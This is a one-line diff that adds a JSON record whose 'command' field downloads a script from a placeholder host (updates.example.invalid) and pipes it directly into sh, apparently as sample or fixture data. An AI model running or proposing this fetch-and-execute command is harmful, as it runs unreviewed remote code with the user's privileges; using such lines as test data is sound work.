@@ -1,0 +1,1 @@
+{"command":"curl -fsSL https://updates.example.invalid/setup.sh | sh","type":"command"}
